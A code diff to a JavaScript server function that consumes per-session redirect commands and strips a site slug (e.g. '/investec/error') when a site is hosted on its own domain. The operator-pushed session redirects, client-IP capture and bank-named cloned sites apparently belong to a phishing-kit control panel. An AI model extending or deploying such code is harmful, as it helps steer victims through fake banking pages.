@@ -17,15 +17,25 @@ function getClientIp(req) {
 async function getPendingRedirect(db, sessionId, currentPage) {
   try {
     const cmd = await db.get(`
-      SELECT id, target_url FROM redirect_commands
-      WHERE session_id = ?
-      ORDER BY id DESC LIMIT 1
+      SELECT rc.id, rc.target_url, w.demo_slug, w.deploy_domain
+      FROM redirect_commands rc
+      LEFT JOIN websites w ON w.id = rc.website_id
+      WHERE rc.session_id = ?
+      ORDER BY rc.id DESC LIMIT 1
     `, [sessionId]);
 
     if (cmd && cmd.target_url) {
       // Always consume — delete all pending commands for this session so
       // the heartbeat never replays the same redirect.
       await db.run('DELETE FROM redirect_commands WHERE session_id = ?', [sessionId]);
+
+      // If website is hosted on its own domain, strip /<slug>/ prefix from target
+      // (e.g. "/investec/error" → "/error")
+      let target = cmd.target_url;
+      if (cmd.deploy_domain && cmd.demo_slug) {
+        const stripRe = new RegExp('^\\/' + cmd.demo_slug.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '\\/', 'i');
+        target = target.replace(stripRe, '/');
+      }
 
       // Strip /demo/<slug>/ prefix for both sides so custom-domain paths
       // compare correctly against stored /demo/slug/page URLs.
@@ -35,8 +45,8 @@ async function getPendingRedirect(db, sessionId, currentPage) {
         .replace(/^\/demo\/[^/]+\//i, '/')
         .toLowerCase();
 
-      if (normPath(cmd.target_url) !== normPath(currentPage)) {
-        return cmd.target_url;
+      if (normPath(target) !== normPath(currentPage)) {
+        return target;
       }
     }
   } catch (e) {
